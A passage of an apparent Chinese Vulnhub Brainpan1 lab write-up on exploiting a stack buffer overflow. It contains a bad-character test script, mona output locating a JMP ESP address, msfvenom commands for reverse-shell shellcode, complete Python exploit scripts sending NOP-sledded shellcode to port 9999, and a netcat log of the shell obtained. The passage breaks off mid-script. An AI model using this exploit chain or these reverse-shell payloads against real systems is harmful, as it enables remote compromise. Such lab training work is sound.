，也就是十进制的468个字符，shellcode通常在300-400</p>\n</li>\n</ol>\n<h2>坏字节识别</h2>\n<p>比如<code>%00</code> 在C语言中就是截断字符。坏字节即使在程序中导致程序无法正常执行的字符</p>\n<p>坏字节字典↓，我们将它放到ESP区域看看是否有坏字节</p>\n<p><a href=\"https://github.com/cytopia/badchars\">https://github.com/cytopia/badchars</a></p>\n<ol>\n<li>\n<p>修改py文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">import</span> socket\nbadchars = (\n  <span class=\"hljs-string\">\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"</span>\n  <span class=\"hljs-string\">\"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"</span>\n  <span class=\"hljs-string\">\"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"</span>\n  <span class=\"hljs-string\">\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"</span>\n  <span class=\"hljs-string\">\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"</span>\n  <span class=\"hljs-string\">\"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"</span>\n  <span class=\"hljs-string\">\"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"</span>\n  <span class=\"hljs-string\">\"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"</span>\n  <span class=\"hljs-string\">\"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"</span>\n  <span class=\"hljs-string\">\"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"</span>\n  <span class=\"hljs-string\">\"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"</span>\n  <span class=\"hljs-string\">\"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"</span>\n  <span class=\"hljs-string\">\"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"</span>\n  <span class=\"hljs-string\">\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"</span>\n  <span class=\"hljs-string\">\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"</span>\n  <span class=\"hljs-string\">\"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"</span>\n)\na = <span class=\"hljs-string\">'A'</span>*<span class=\"hljs-number\">524</span>+<span class=\"hljs-string\">'B'</span>*<span class=\"hljs-number\">4</span>+badchars\ns = socket.socket()\ns.connect((<span class=\"hljs-string\">'192.168.75.161'</span>,<span class=\"hljs-number\">9999</span>))\nr = s.recv(<span class=\"hljs-number\">1024</span>)\ns.send(a.encode(<span class=\"hljs-string\">'utf-8'</span>))\ns.close()\n</code></pre>\n</li>\n<li>\n<p>发送后windows下选中ESP右键选择<code>fellow Dump</code> 查看内存情况</p>\n<p><img src=\"/post-images/VulnhubBrainpan1/image53.png\" alt=\"image.png\"></p>\n<p>内存是连续就不存在坏字符，出现坏字符应该是显示00</p>\n</li>\n</ol>\n<h2>定位jmp esp</h2>\n<p>输入shellcode可以放在ESP中，但是怎么保证能正常走到ESP，所以我们要找到<code>JMP ESP</code>的内存地址，将它覆盖到EIP处即可</p>\n<p><code>JMP ESP</code>的操作码是<code>FFE4</code></p>\n<ol>\n<li>\n<p><code>ImmuityDebugger</code> 可以方便执行py脚本，左下角输入框输入 <code>!mona modules</code>可以查看当前程序保护机制</p>\n<pre><code class=\"hljs language-python\">0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------\n0BADF00D    Module info :\n0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------\n0BADF00D    Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename &#x26; Path, DLLCharacteristics\n0BADF00D   ----------------------------------------------------------------------------------------------------------------------------------------------\n0BADF00D    <span class=\"hljs-number\">0x76750000</span> | <span class=\"hljs-number\">0x7694c000</span> | <span class=\"hljs-number\">0x001fc000</span> | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-literal\">True</span>    | <span class=\"hljs-literal\">True</span>  | <span class=\"hljs-literal\">True</span>  |  <span class=\"hljs-literal\">False</span>   | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.18362</span><span class=\"hljs-number\">.329</span> [KERNELBASE.dll] (C:\\Windows\\System32\\KERNELBASE.dll) <span class=\"hljs-number\">0x4140</span>\n0BADF00D    <span class=\"hljs-number\">0x77100000</span> | <span class=\"hljs-number\">0x7715e000</span> | <span class=\"hljs-number\">0x0005e000</span> | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-literal\">True</span>    | <span class=\"hljs-literal\">True</span>  | <span class=\"hljs-literal\">True</span>  |  <span class=\"hljs-literal\">False</span>   | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.18362</span><span class=\"hljs-number\">.1</span> [WS2_32.DLL] (C:\\Windows\\System32\\WS2_32.DLL) <span class=\"hljs-number\">0x4140</span>\n0BADF00D    <span class=\"hljs-number\">0x76950000</span> | <span class=\"hljs-number\">0x769af000</span> | <span class=\"hljs-number\">0x0005f000</span> | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-literal\">True</span>    | <span class=\"hljs-literal\">True</span>  | <span class=\"hljs-literal\">True</span>  |  <span class=\"hljs-literal\">False</span>   | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.18362</span><span class=\"hljs-number\">.295</span> [bcryptPrimitives.dll] (C:\\Windows\\System32\\bcryptPrimitives.dll) <span class=\"hljs-number\">0x41c0</span>\n0BADF00D    <span class=\"hljs-number\">0x77000000</span> | <span class=\"hljs-number\">0x770e0000</span> | <span class=\"hljs-number\">0x000e0000</span> | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-literal\">True</span>    | <span class=\"hljs-literal\">True</span>  | <span class=\"hljs-literal\">True</span>  |  <span class=\"hljs-literal\">False</span>   | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.18362</span><span class=\"hljs-number\">.329</span> [KERNEL32.DLL] (C:\\Windows\\System32\\KERNEL32.DLL) <span class=\"hljs-number\">0x4140</span>\n0BADF00D    <span class=\"hljs-number\">0x761c0000</span> | <span class=\"hljs-number\">0x7627f000</span> | <span class=\"hljs-number\">0x000bf000</span> | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-literal\">True</span>    | <span class=\"hljs-literal\">True</span>  | <span class=\"hljs-literal\">True</span>  |  <span class=\"hljs-literal\">False</span>   | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-number\">7.0</span><span class=\"hljs-number\">.18362</span><span class=\"hljs-number\">.1</span> [msvcrt.dll] (C:\\Windows\\System32\\msvcrt.dll) <span class=\"hljs-number\">0x4140</span>\n0BADF00D    <span class=\"hljs-number\">0x75090000</span> | <span class=\"hljs-number\">0x7509a000</span> | <span class=\"hljs-number\">0x0000a000</span> | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-literal\">True</span>    | <span class=\"hljs-literal\">True</span>  | <span class=\"hljs-literal\">True</span>  |  <span class=\"hljs-literal\">False</span>   | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.18362</span><span class=\"hljs-number\">.1</span> [CRYPTBASE.dll] (C:\\Windows\\System32\\CRYPTBASE.dll) <span class=\"hljs-number\">0x4540</span>\n0BADF00D    <span class=\"hljs-number\">0x750a0000</span> | <span class=\"hljs-number\">0x750c0000</span> | <span class=\"hljs-number\">0x00020000</span> | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-literal\">True</span>    | <span class=\"hljs-literal\">True</span>  | <span class=\"hljs-literal\">True</span>  |  <span class=\"hljs-literal\">False</span>   | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.18362</span><span class=\"hljs-number\">.1</span> [SspiCli.dll] (C:\\Windows\\System32\\SspiCli.dll) <span class=\"hljs-number\">0x4140</span>\n0BADF00D    <span class=\"hljs-number\">0x778d0000</span> | <span class=\"hljs-number\">0x77a6a000</span> | <span class=\"hljs-number\">0x0019a000</span> | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-literal\">True</span>    | <span class=\"hljs-literal\">True</span>  | <span class=\"hljs-literal\">True</span>  |  <span class=\"hljs-literal\">False</span>   | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.18362</span><span class=\"hljs-number\">.329</span> [ntdll.dll] (C:\\Windows\\SYSTEM32\\ntdll.dll) <span class=\"hljs-number\">0x4140</span>\n0BADF00D    <span class=\"hljs-number\">0x31170000</span> | <span class=\"hljs-number\">0x31176000</span> | <span class=\"hljs-number\">0x00006000</span> | <span class=\"hljs-literal\">False</span>  | <span class=\"hljs-literal\">False</span>   | <span class=\"hljs-literal\">False</span> | <span class=\"hljs-literal\">False</span> |  <span class=\"hljs-literal\">False</span>   | <span class=\"hljs-literal\">False</span>  | -<span class=\"hljs-number\">1.0</span>- [brainpan.exe] (C:\\Users\\ensp\\Desktop\\brainpan.exe) <span class=\"hljs-number\">0x0</span>\n0BADF00D    <span class=\"hljs-number\">0x750e0000</span> | <span class=\"hljs-number\">0x7519b000</span> | <span class=\"hljs-number\">0x000bb000</span> | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-literal\">True</span>    | <span class=\"hljs-literal\">True</span>  | <span class=\"hljs-literal\">True</span>  |  <span class=\"hljs-literal\">False</span>   | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.18362</span><span class=\"hljs-number\">.1</span> [RPCRT4.dll] (C:\\Windows\\System32\\RPCRT4.dll) <span class=\"hljs-number\">0x4140</span>\n0BADF00D    <span class=\"hljs-number\">0x76ec0000</span> | <span class=\"hljs-number\">0x76f36000</span> | <span class=\"hljs-number\">0x00076000</span> | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-literal\">True</span>    | <span class=\"hljs-literal\">True</span>  | <span class=\"hljs-literal\">True</span>  |  <span class=\"hljs-literal\">False</span>   | <span class=\"hljs-literal\">True</span>   | <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.18362</span><span class=\"hljs-number\">.1</span> [sechost.dll] (C:\\Windows\\System32\\sechost.dll) <span class=\"hljs-number\">0x4140</span>\n0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------\n</code></pre>\n<p><code>brainpan.exe</code>没有任何保护，很容易被利用，所以我们就在该文件里面寻找<code>JMP ESP</code> (其实不一定要用brainpan.exe的JMP ESP，其他未开启保护机制的程序也可以，但是其他程序现在难以定位)</p>\n</li>\n<li>\n<p>定位输入框输入 ：<code>!mona find -s  \"\\xff\\xe4\"  -m brainpan.exe</code></p>\n<pre><code class=\"hljs language-python\">Results :\n<span class=\"hljs-number\">0x311712f3</span> : <span class=\"hljs-string\">\"\\xff\\xe4\"</span> |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: <span class=\"hljs-literal\">False</span>, Rebase: <span class=\"hljs-literal\">False</span>, SafeSEH: <span class=\"hljs-literal\">False</span>, CFG: <span class=\"hljs-literal\">False</span>, OS: <span class=\"hljs-literal\">False</span>, v-<span class=\"hljs-number\">1.0</span>- (C:\\Users\\ensp\\Desktop\\brainpan.exe), <span class=\"hljs-number\">0x0</span>\n</code></pre>\n<p><code>0x311712f3</code>地址下存放JMP ESP指令，因为是小端显示所以需要以倒叙的插入<code>\\xf3\\x12\\x17\\x31</code></p>\n</li>\n</ol>\n<h2>插入shellcode</h2>\n<ol>\n<li>\n<p>使用msfvenom生成</p>\n<p>-p 为 payload -b 指定坏字符 -e 指定编码 -f 格式化输出为python语言</p>\n<pre><code class=\"hljs language-python\">msfvenom -p windows/shell_reverse_tcp LHOST=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span> LPORT=<span class=\"hljs-number\">1234</span> -e x86/shikata_ga_nai -b <span class=\"hljs-string\">\"\\x00\\x0a\\x0d\"</span> -f python\n//\n[-] No platform was selected, choosing Msf::Module::Platform::Windows <span class=\"hljs-keyword\">from</span> the payload\n[-] No arch selected, selecting arch: x86 <span class=\"hljs-keyword\">from</span> the payload\nFound <span class=\"hljs-number\">1</span> compatible encoders\nAttempting to encode payload <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">1</span> iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded <span class=\"hljs-keyword\">with</span> size <span class=\"hljs-number\">351</span> (iteration=<span class=\"hljs-number\">0</span>)\nx86/shikata_ga_nai chosen <span class=\"hljs-keyword\">with</span> final size <span class=\"hljs-number\">351</span>\nPayload size: <span class=\"hljs-number\">351</span> <span class=\"hljs-built_in\">bytes</span>\nFinal size of python file: <span class=\"hljs-number\">1745</span> <span class=\"hljs-built_in\">bytes</span>\nbuf =  <span class=\"hljs-string\">b\"\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xd9\\xc2\\xd9\\x74\\x24\\xf4\\xba\\xb3\\xbf\\xd6\\xb2\\x58\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x31\\xc9\\xb1\\x52\\x31\\x50\\x17\\x03\\x50\\x17\\x83\\x73\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xbb\\x34\\x47\\x8f\\x2c\\x3a\\xa8\\x6f\\xad\\x5b\\x20\\x8a\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x9c\\x5b\\x56\\xdf\\x8f\\x6b\\x1c\\x8d\\x23\\x07\\x70\\x25\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xb7\\x65\\x5d\\x4a\\x70\\xc3\\xbb\\x65\\x81\\x78\\xff\\xe4\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x01\\x83\\x2c\\xc6\\x38\\x4c\\x21\\x07\\x7c\\xb1\\xc8\\x55\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xd5\\xbd\\x7f\\x49\\x52\\x8b\\x43\\xe2\\x28\\x1d\\xc4\\x17\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xf8\\x1c\\xe5\\x86\\x72\\x47\\x25\\x29\\x56\\xf3\\x6c\\x31\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xbb\\x3e\\x26\\xca\\x0f\\xb4\\xb9\\x1a\\x5e\\x35\\x15\\x63\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x6e\\xc4\\x67\\xa4\\x49\\x37\\x12\\xdc\\xa9\\xca\\x25\\x1b\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xd3\\x10\\xa3\\xbf\\x73\\xd2\\x13\\x1b\\x85\\x37\\xc5\\xe8\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x89\\xfc\\x81\\xb6\\x8d\\x03\\x45\\xcd\\xaa\\x88\\x68\\x01\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x3b\\xca\\x4e\\x85\\x67\\x88\\xef\\x9c\\xcd\\x7f\\x0f\\xfe\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xad\\x20\\xb5\\x75\\x43\\x34\\xc4\\xd4\\x0c\\xf9\\xe5\\xe6\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xcc\\x95\\x7e\\x95\\xfe\\x3a\\xd5\\x31\\xb3\\xb3\\xf3\\xc6\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xb4\\xe9\\x44\\x58\\x4b\\x12\\xb5\\x71\\x88\\x46\\xe5\\xe9\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x39\\xe7\\x6e\\xe9\\xc6\\x32\\x20\\xb9\\x68\\xed\\x81\\x69\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xc9\\x5d\\x6a\\x63\\xc6\\x82\\x8a\\x8c\\x0c\\xab\\x21\\x77\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xc7\\x14\\x1d\\x3c\\x80\\xfd\\x5c\\xc2\\xaa\\x2f\\xe9\\x24\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xd8\\xdf\\xbc\\xff\\x75\\x79\\xe5\\x8b\\xe4\\x86\\x33\\xf6\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x27\\x0c\\xb0\\x07\\xe9\\xe5\\xbd\\x1b\\x9e\\x05\\x88\\x41\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x09\\x19\\x26\\xed\\xd5\\x88\\xad\\xed\\x90\\xb0\\x79\\xba\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xf5\\x07\\x70\\x2e\\xe8\\x3e\\x2a\\x4c\\xf1\\xa7\\x15\\xd4\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x2e\\x14\\x9b\\xd5\\xa3\\x20\\xbf\\xc5\\x7d\\xa8\\xfb\\xb1\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xd1\\xff\\x55\\x6f\\x94\\xa9\\x17\\xd9\\x4e\\x05\\xfe\\x8d\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x17\\x65\\xc1\\xcb\\x17\\xa0\\xb7\\x33\\xa9\\x1d\\x8e\\x4c\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x06\\xca\\x06\\x35\\x7a\\x6a\\xe8\\xec\\x3e\\x9a\\xa3\\xac\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x17\\x33\\x6a\\x25\\x2a\\x5e\\x8d\\x90\\x69\\x67\\x0e\\x10\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x12\\x9c\\x0e\\x51\\x17\\xd8\\x88\\x8a\\x65\\x71\\x7d\\xac\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xda\\x72\\x54\"</span>\n\n</code></pre>\n</li>\n<li>\n<p>因为我们加密呢，会生成几个桩来解码，中间需要多加几个<strong>啥也不做的指令NOP（\\x90）</strong>，称为slide，防止“桩”被抹掉导致代码无法成功执行</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">import</span> socket\nbuf =  <span class=\"hljs-string\">b\"\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xd9\\xc2\\xd9\\x74\\x24\\xf4\\xba\\xb3\\xbf\\xd6\\xb2\\x58\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x31\\xc9\\xb1\\x52\\x31\\x50\\x17\\x03\\x50\\x17\\x83\\x73\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xbb\\x34\\x47\\x8f\\x2c\\x3a\\xa8\\x6f\\xad\\x5b\\x20\\x8a\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x9c\\x5b\\x56\\xdf\\x8f\\x6b\\x1c\\x8d\\x23\\x07\\x70\\x25\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xb7\\x65\\x5d\\x4a\\x70\\xc3\\xbb\\x65\\x81\\x78\\xff\\xe4\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x01\\x83\\x2c\\xc6\\x38\\x4c\\x21\\x07\\x7c\\xb1\\xc8\\x55\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xd5\\xbd\\x7f\\x49\\x52\\x8b\\x43\\xe2\\x28\\x1d\\xc4\\x17\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xf8\\x1c\\xe5\\x86\\x72\\x47\\x25\\x29\\x56\\xf3\\x6c\\x31\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xbb\\x3e\\x26\\xca\\x0f\\xb4\\xb9\\x1a\\x5e\\x35\\x15\\x63\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x6e\\xc4\\x67\\xa4\\x49\\x37\\x12\\xdc\\xa9\\xca\\x25\\x1b\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xd3\\x10\\xa3\\xbf\\x73\\xd2\\x13\\x1b\\x85\\x37\\xc5\\xe8\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x89\\xfc\\x81\\xb6\\x8d\\x03\\x45\\xcd\\xaa\\x88\\x68\\x01\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x3b\\xca\\x4e\\x85\\x67\\x88\\xef\\x9c\\xcd\\x7f\\x0f\\xfe\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xad\\x20\\xb5\\x75\\x43\\x34\\xc4\\xd4\\x0c\\xf9\\xe5\\xe6\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xcc\\x95\\x7e\\x95\\xfe\\x3a\\xd5\\x31\\xb3\\xb3\\xf3\\xc6\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xb4\\xe9\\x44\\x58\\x4b\\x12\\xb5\\x71\\x88\\x46\\xe5\\xe9\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x39\\xe7\\x6e\\xe9\\xc6\\x32\\x20\\xb9\\x68\\xed\\x81\\x69\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xc9\\x5d\\x6a\\x63\\xc6\\x82\\x8a\\x8c\\x0c\\xab\\x21\\x77\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xc7\\x14\\x1d\\x3c\\x80\\xfd\\x5c\\xc2\\xaa\\x2f\\xe9\\x24\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xd8\\xdf\\xbc\\xff\\x75\\x79\\xe5\\x8b\\xe4\\x86\\x33\\xf6\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x27\\x0c\\xb0\\x07\\xe9\\xe5\\xbd\\x1b\\x9e\\x05\\x88\\x41\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x09\\x19\\x26\\xed\\xd5\\x88\\xad\\xed\\x90\\xb0\\x79\\xba\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xf5\\x07\\x70\\x2e\\xe8\\x3e\\x2a\\x4c\\xf1\\xa7\\x15\\xd4\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x2e\\x14\\x9b\\xd5\\xa3\\x20\\xbf\\xc5\\x7d\\xa8\\xfb\\xb1\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xd1\\xff\\x55\\x6f\\x94\\xa9\\x17\\xd9\\x4e\\x05\\xfe\\x8d\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x17\\x65\\xc1\\xcb\\x17\\xa0\\xb7\\x33\\xa9\\x1d\\x8e\\x4c\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x06\\xca\\x06\\x35\\x7a\\x6a\\xe8\\xec\\x3e\\x9a\\xa3\\xac\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x17\\x33\\x6a\\x25\\x2a\\x5e\\x8d\\x90\\x69\\x67\\x0e\\x10\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x12\\x9c\\x0e\\x51\\x17\\xd8\\x88\\x8a\\x65\\x71\\x7d\\xac\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xda\\x72\\x54\"</span>\na = <span class=\"hljs-string\">b'A'</span>*<span class=\"hljs-number\">524</span>+<span class=\"hljs-string\">b'\\xf3\\x12\\x17\\x31'</span>+<span class=\"hljs-string\">b'\\x90'</span>*<span class=\"hljs-number\">16</span>+buf\ns = socket.socket()\ns.connect((<span class=\"hljs-string\">'192.168.75.161'</span>,<span class=\"hljs-number\">9999</span>))\nr = s.recv(<span class=\"hljs-number\">1024</span>)\ns.send(a)\ns.close()\n</code></pre>\n</li>\n<li>\n<p>现在windows运行brainpan.exe，然后再运行py文件</p>\n<p>获得测试机shell</p>\n<pre><code class=\"hljs language-python\">nc -lvp <span class=\"hljs-number\">1234</span>\nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.161</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.161</span>] <span class=\"hljs-number\">49967</span>\nMicrosoft Windows [�汾 <span class=\"hljs-number\">10.0</span><span class=\"hljs-number\">.18363</span><span class=\"hljs-number\">.418</span>]\n(c) <span class=\"hljs-number\">2019</span> Microsoft Corporation����������Ȩ����\n\nC:\\Users\\ensp\\Desktop>\n</code></pre>\n</li>\n</ol>\n<h2>获得shell</h2>\n<ol>\n<li>\n<p>生成linux下的反弹shell代码覆盖之前windows的</p>\n<pre><code class=\"hljs language-python\">msfvenom -p linux/x86/shell_reverse_tcp -b <span class=\"hljs-string\">'\\x00\\x0a\\x0d'</span> LHOST=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span> LPORT=<span class=\"hljs-number\">1234</span> -e x86/shikata_ga_nai -f python\n[-] No platform was selected, choosing Msf::Module::Platform::Linux <span class=\"hljs-keyword\">from</span> the payload\n[-] No arch selected, selecting arch: x86 <span class=\"hljs-keyword\">from</span> the payload\nFound <span class=\"hljs-number\">1</span> compatible encoders\nAttempting to encode payload <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">1</span> iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded <span class=\"hljs-keyword\">with</span> size <span class=\"hljs-number\">95</span> (iteration=<span class=\"hljs-number\">0</span>)\nx86/shikata_ga_nai chosen <span class=\"hljs-keyword\">with</span> final size <span class=\"hljs-number\">95</span>\nPayload size: <span class=\"hljs-number\">95</span> <span class=\"hljs-built_in\">bytes</span>\nFinal size of python file: <span class=\"hljs-number\">479</span> <span class=\"hljs-built_in\">bytes</span>\nbuf =  <span class=\"hljs-string\">b\"\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xdb\\xcf\\xbe\\xfd\\x3c\\x9e\\x52\\xd9\\x74\\x24\\xf4\\x5f\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x33\\xc9\\xb1\\x12\\x31\\x77\\x17\\x03\\x77\\x17\\x83\\x3a\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x38\\x7c\\xa7\\xf5\\x9a\\x77\\xab\\xa6\\x5f\\x2b\\x46\\x4a\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xe9\\x2a\\x26\\x2c\\x24\\x2c\\xd4\\xe9\\x06\\x12\\x16\\x89\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x2e\\x14\\x51\\xe1\\x70\\x4e\\xea\\x66\\x18\\x8d\\xed\\x8c\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x0b\\x18\\x0c\\x3c\\xcd\\x4b\\x9e\\x6f\\xa1\\x6f\\xa9\\x6e\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x08\\xef\\xfb\\x18\\xfd\\xdf\\x88\\xb0\\x69\\x0f\\x40\\x22\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x03\\xc6\\x7d\\xf0\\x80\\x51\\x60\\x44\\x2d\\xaf\\xe3\"</span>\n</code></pre>\n</li>\n<li>\n<p>发送，获得shell</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">import</span> socket\nbuf =  <span class=\"hljs-string\">b\"\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xdb\\xcf\\xbe\\xfd\\x3c\\x9e\\x52\\xd9\\x74\\x24\\xf4\\x5f\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x33\\xc9\\xb1\\x12\\x31\\x77\\x17\\x03\\x77\\x17\\x83\\x3a\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x38\\x7c\\xa7\\xf5\\x9a\\x77\\xab\\xa6\\x5f\\x2b\\x46\\x4a\"</span>\nbuf += <span class=\"hljs-string\">b\"\\xe9\\x2a\\x26\\x2c\\x24\\x2c\\xd4\\xe9\\x06\\x12\\x16\\x89\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x2e\\x14\\x51\\xe1\\x70\\x4e\\xea\\x66\\x18\\x8d\\xed\\x8c\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x0b\\x18\\x0c\\x3c\\xcd\\x4b\\x9e\\x6f\\xa1\\x6f\\xa9\\x6e\"</span>\nbuf += <span class=\"hljs-string\">b\"\\x08\\xef\\xfb\\x18\\xfd\\xdf\\x88\\xb0\\x69\\x0f\\x40\\x22\"</span>\nbuf += <span 